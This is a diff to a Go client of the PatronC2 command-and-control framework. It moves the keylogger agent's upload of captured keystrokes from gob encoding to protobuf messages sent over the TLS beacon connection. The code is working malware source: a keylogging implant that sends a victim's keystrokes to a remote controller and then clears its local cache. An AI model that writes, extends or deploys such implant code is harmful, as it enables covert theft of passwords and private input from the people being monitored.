@@ -2,15 +2,15 @@ package main
 
 import (
 	"crypto/tls"
-	"encoding/gob"
 	"fmt"
 	"log"
 	"strings"
 	"time"
 
+	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
 	"github.com/PatronC2/Patron/client/client_utils"
+	"github.com/PatronC2/Patron/lib/common"
 	"github.com/PatronC2/Patron/lib/logger"
-	"github.com/PatronC2/Patron/types"
 	"github.com/PatronC2/linux-keylogger-1/keylogger"
 )
 
@@ -135,7 +135,7 @@ func main() {
 			continue
 		}
 
-		if err := handleKeysRequest(beacon, encoder, decoder, agentID); err != nil {
+		if err := handleKeysRequest(beacon, agentID); err != nil {
 			client_utils.HandleError(beacon, "keylogs", err)
 			continue
 		}
@@ -153,21 +153,28 @@ func main() {
 	}
 }
 
-func handleKeysRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
+func handleKeysRequest(conn *tls.Conn, agentID string) error {
 	logger.Logf(logger.Info, "Sending keylogs: %v", cache)
-	keyResponse := types.KeysRequest{
-		AgentID: agentID,
-		Keys:    cache,
+
+	req := &patronobuf.Request{
+		Type: patronobuf.RequestType_KEYS,
+		Payload: &patronobuf.Request_Keys{
+			Keys: &patronobuf.KeysRequest{
+				Uuid: agentID,
+				Keys: cache,
+			},
+		},
 	}
 
-	if err := client_utils.SendRequest(encoder, types.KeysRequestType, keyResponse); err != nil {
-		return err
+	if err := common.WriteDelimited(conn, req); err != nil {
+		return fmt.Errorf("failed to send keys request: %w", err)
 	}
-	var response types.Response
-	if err := decoder.Decode(&response); err != nil {
-		return fmt.Errorf("error decoding command response: %v", err)
+
+	resp := &patronobuf.Response{}
+	if err := common.ReadDelimited(conn, resp); err != nil {
+		return fmt.Errorf("failed to read keys response: %w", err)
 	}
+
 	cache = ""
-
 	return nil
 }
